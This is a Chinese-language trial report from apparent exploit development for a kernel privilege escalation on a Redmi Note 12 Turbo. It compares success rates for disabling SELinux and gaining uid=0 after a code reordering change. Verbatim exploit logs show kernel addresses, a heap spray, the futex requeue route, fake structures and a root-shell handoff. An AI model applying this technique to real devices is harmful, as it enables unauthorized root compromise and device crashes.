# Device gate: marble 5.10.149 — v4 prepare-cohort 释放顺序（W1 落地率）

## 结论

在 Redmi Note 12 Turbo（marble，`3e6f1443`，内核 `5.10.149-android12-9-00001-gda3d81545d1d-ab9545656`）上，
把 `prepare_kernel_page()` 的 prepare-cohort 释放（关闭 memfd + `kill_child`）从发送循环**之后**移到
**之前**（v4，`src/core/support/util.cpp:747-754`），W1（SELinux）落地率由同日基线的 **4/15 = 26.7%**
升到 **24/30 = 80.0%**，uid=0 命中率由 **0/15 = 0%** 升到 **21/30 = 70.0%**；两者在单尾 Fisher
精确检验下分别为 **p = 7.96e-04** 与 **p = 3.79e-06**（见 §统计检验）。

两组的 native 代码只差 v4 这一处：受控对比（同一棵树单独回退 v4 后重编）下其余 6 个攻击函数
**逐字节相同（strict）**，只有 `prepare_good_kernel_page` 多 9 条指令，且调用序列显示 close + kill
这一对释放调用从 sendmsg 组之后移到之前（见 `docs/analysis/5.10-reclaim-order-v4.md` §7）。
对照组包内 `libghostlock.so` sha256 `A2B8BF9DF34A21D57EA6DCFBD11640906A4B651FCB3B3A321446D4D1CC9B33AE`
与 5.10 端口基线 `3542b61` 的构建物逐字节相同 ⇒ **v4 是唯一变量**。

复算命令（本文件所有数字都由它产出）：

```sh
python tools/trials/tally.py build/510profile/rounds-p01p02-ctl/summary.txt \
                              build/510profile/rounds-p01p02-v4b/summary.txt
```

（参数顺序是「对照在前、候选在后」；交换会改变单尾 p 值的方向。）

## 判据

| 项 | v4 批次 | 对照组（基线） |
| --- | --- | --- |
| 调用 | `tools/trials/trials_ps4.ps1 -Rounds 30 -Dev 3e6f1443 -PollSeconds 70 -SettleSeconds 20 -Tag "rounds-p01p02-v4b" -RebootAfterHit`（归档副本 md5 `B8B29124B037A464ABEBEB576219A8F3`；批次运行到一半时该文件被打了「重启后 uptime 打印」补丁，进程启动时编译的是补丁前内容 ⇒ 只影响一行日志打印，不影响判轮逻辑） | `tools/trials/trials_ps4.ps1 -Rounds 15 -Dev 3e6f1443 -PollSeconds 70 -SettleSeconds 20 -Tag "rounds-p01p02-ctl" -RebootAfterHit` |
| 时间 | 2026-10-14 12:32:04–13:41:28 | 2026-10-14 11:24:48–11:47:47 |
| 已跑轮数 | 30 | 15 |
| W1 落地（`SELinux permissive`） | 24（80.0%） | 4（26.7%） |
| 进入 W2 | 24 | 4 |
| verdict `HIT-ROOT`（child uid=0） | 21（70.0%） | 0（0%） |
| verdict `PANIC` | 8 | 15 |
| verdict `FREEZE` | 1 | 0 |
| 每轮 up_before | 43–55 s（每轮新启动） | 45–55 s（每轮新启动） |
| native 二进制 | `build/native/ghostlock` md5 `DFB94C4322CBEDC423049444C0CC260C`（2782744 B，与设备 APK 内 `.so` 同源） | 基线 `.so` sha256 `A2B8BF9D…`（见上） |
| 设备 APK | `base.apk` md5 `69567f0a335010e63b1b4df3c1c46f06`（`/data/app/~~FunqcQMm2GG3jf09u35nag==/com.ghostlock.app-ry_lX96FvGqqa9b_HQI-BQ==/base.apk`） | 基线 APK（同日安装） |
| 日志 | `build/510profile/rounds-p01p02-v4b/round-N.full.log` + `summary.txt` | `build/510profile/rounds-p01p02-ctl/` |
| 归档时间 | 2026-10-14 | 2026-10-14 |

## 统计检验（Fisher 精确检验，单尾）

`python tools/trials/tally.py <ctl summary.txt> <v4b summary.txt>` 的输出（一字不改）：

```
control  : rounds=15 hits=0 W1=ok 4 W2=4
candidate: rounds=30 hits=21 W1=ok 24 W2=24
hit rate   control 0/15 vs candidate 21/30: p=3.79e-06
W1 landing control 4/15 vs candidate 24/30: p=0.000796
hit|W2     control 0/4 vs candidate 21/24: p=0.00171
```

三项都显著 ⇒ 差异不是批次噪声；配合「两组只差 v4 一处源码改动 + 受控反汇编对比」，可以判定因果。

## round 14 命中证据链（逐字）

```
[*] debug.execution.stages.w3_chain_rounds=1
[*] debug.execution.stages.w3_attempts=0
[+] startup limits pid=9545 NoNewPrivs=0 Seccomp=2 Seccomp_filters=1
[-] SELinux enforce unreadable; assuming enforcing and running W1
[*] W1: SELinux attempt 1/15
[*] === W1: SELinux === target=0xffffff802aa2fb98 mode=1 leaf=0
[*] pselect route setup shift=-2 page=ffffff8867018000 fake_lock=ffffff8867018000 fake_w0=ffffff8867018300 fake_task=ffffff8867018400 in0=ffffff8867018100 in3=ffffff8867018100 out0=ffffff802aa2fb98 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[*] pselect pre-select attempt=1/4 compact=2 +0ms
[*] pselect post-select attempt=1/4 compact=2 +203ms ret=4
[*] pselect route done calls=1 success=1 status=0 clean=1/1 step=0 errno=0
[+] SELinux permissive
[*] perf task: 0xffffff8802ae0000 (7766/8136 votes)
[*] perf task: 0xffffff8802ae0000 (7772/8160 votes)
[*] perf task: 0xffffff8802ae0000 (7786/8191 votes)
[*] W2: cred attempt 1/15
[*] === W2: cred === target=0xffffff8802ae0780 mode=2 leaf=0
[*] pselect route setup shift=-2 page=ffffff88fb0c0000 fake_lock=ffffff88fb0c0000 fake_w0=ffffff88fb0c0300 fake_task=ffffff88fb0c0400 in0=ffffff802a7a0930 in3=ffffff802a7a0930 out0=ffffff8802ae0780 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[*] pselect pre-select attempt=1/4 compact=2 +0ms
[*] pselect post-select attempt=1/4 compact=2 +212ms ret=4
[*] pselect route done calls=1 success=1 status=0 clean=1/1 step=0 errno=0
[*] child uid = 0
[+] child is root!
[*] handoff: child=12431 alive=1 sent=1 errno=0
[*] handoff: root script path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[*] handoff: root shell worker pid=15342
[*] handoff: script open fd=320 errno=0 path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[-] W3 disabled by profile (w3_attempts=0); leaving the app seccomp filter armed
[-] temporary root ready; KernelSU module not loaded (W3 seccomp clear failed)
[*] fork-hold parked pid=16398; reclaim sockets survive this exit
```

三条 P0 判据在本轮齐备：P0-2 `W3 disabled by profile (w3_attempts=0)`、P0-1
`fork-hold parked pid=16398`、以及无重启（up_before `45.01` → up_after `148.22`，+103 s ≈ 一次 run
的时长）。W1 与 W2 的 pselect 各只发一次（`calls=1 success=1`），`shift=-2` 与历史成功轮一致。

## miss 轮签名（round 20 / round 21，逐字）

```
[*] [T+1838ms]   heap spray done
[*] [route] creating waiter/owner/consumer
[*] consumer thread running on cpu=5
[*] [route] waiter parked; owner started
[*] [route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[*] pselect route setup shift=-2 page=ffffff8807170000 fake_lock=ffffff8807170000 fake_w0=ffffff8807170300 fake_task=ffffff8807170400 in0=ffffff8807170100 in3=ffffff8807170100 out0=ffffff802aa2fb98 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[*] pselect pre-select attempt=1/4 compact=2 +0ms
[*] consumer gate: waiter parked in syscall 72
```

round 20 在此之后设备 panic 重启（`PANIC`），round 21 相同形状但整机冻结（`FREEZE`，harness 判定
后重启）。⇒ 打偏轮的死亡点与历史 pathA 一致（W1 pselect 内），**v4 没有改变 miss 形态**，只提高了
W1 落地率。

## 主机侧验证

- NDK 构建零告警：`make -C src ghostlock` exit 0、`warning:` 计数 0；两次独立重建（删 `util.o`）
  得到同一 md5 `DFB94C4322CBEDC423049444C0CC260C` ⇒ 构建可复现，且与设备 APK 内的 `.so` 同源。
- `make -C src lint-tidy`（需 `NDK_ROOT` 与 `D:\platform\Git\usr\bin` 在 PATH）exit 0，
  0 条 user-code 告警。
- host tests 需在 WSL 下执行（本机默认 `c++` 是 llvm-mingw，无 POSIX 头）：**27 个测试二进制全部
  PASS**（`build/host-test/` 里另有 2 个 `.o` 中间文件，遍历脚本会误当测试，实际不是测试）；唯一
  没有产出的是 `tcp_zerocopy_route_test`，**编译**不过（`core/route/tcp_zerocopy_route.cpp:47` 的裸
  aarch64 `yield` 内联汇编没有 arch guard，`make -k` 的 `build-exit=2` 只由该目标引起）⇒ 既有
  可移植性缺陷，非本次改动引入。

## 未决

1. 打偏轮仍会重启或冻机 ⇒「每一轮都不重启」目标未达成。marble 上**拿不到内核侧证据**：无
   pstore/ramoops（`/sys/fs/pstore` 空），`panic_on_oops=1` 时 panic 立即重启，设备侧 kmsg 尾随器
   来不及落盘 ⇒ 只能靠机理分析 + 真机统计。
2. round 21 的 `FREEZE` 是新形态（同 miss 点，整机冻结而非 panic），与「看门狗被 unbind 后打偏即
   冻」一致；批次靠 `-RebootAfterHit` 与 freeze 检测自动重启继续。
3. host tests 的可移植性修复（`tcp_zerocopy_route_test` 加 arch guard）未做。
4. KernelSU 模块加载仍未通（W3 被 profile 关闭，只能拿 temporary root）。
